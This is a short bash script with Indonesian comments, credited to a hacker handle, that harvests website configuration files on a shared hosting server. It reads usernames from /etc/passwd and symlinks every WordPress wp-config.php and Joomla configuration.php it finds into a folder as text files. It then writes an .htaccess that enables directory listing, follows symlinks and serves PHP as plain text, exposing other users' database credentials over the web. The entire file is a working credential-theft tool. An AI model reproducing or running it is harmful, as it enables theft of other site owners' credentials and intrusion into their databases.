#!/bin/bash
echo "CREATE BY MATIGAN1337"
echo "-----------------------"

# Membuat folder baru untuk menyimpan tautan simbolik dan file .htaccess
output_folder="symlinks"
mkdir -p "$output_folder"

# Mendapatkan daftar nama pengguna dari /etc/passwd
usernames=$(awk -F: '{print $1}' /etc/passwd)

# Loop melalui setiap pengguna dan membuat tautan simbolik untuk wp-config.php dan configuration.php jika ada
for user in $usernames
do
  config_path_wp="/home/$user/public_html/wp-config.php"
  config_path_joomla="/home/$user/public_html/configuration.php"
  
  # Mengecek apakah file wp-config.php ada
  if [ -f "$config_path_wp" ]; then
    # Membuat tautan simbolik untuk WordPress ke folder utama dengan nama [username]-WP-config.txt
    ln -s "$config_path_wp" "$output_folder/${user}-WP-config.txt"
    echo "WordPress Config symlink created for user $user"
  fi

  # Mengecek apakah file configuration.php ada
  if [ -f "$config_path_joomla" ]; then
    # Membuat tautan simbolik untuk Joomla ke folder utama dengan nama [username]-JOOMLA-config.txt
    ln -s "$config_path_joomla" "$output_folder/${user}-JOOMLA-config.txt"
    echo "Joomla Config symlink created for user $user"
  fi
done

# Membuat file .htaccess sekali setelah membuat folder dan symlink
htaccess_content="Options Indexes FollowSymLinks\nDirectoryIndex tiganku.htm\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any"
echo -e "$htaccess_content" > "$output_folder/.htaccess"
echo ".htaccess file created."

echo "Script telah selesai. Symlinks dan .htaccess disimpan dalam folder $output_folder"
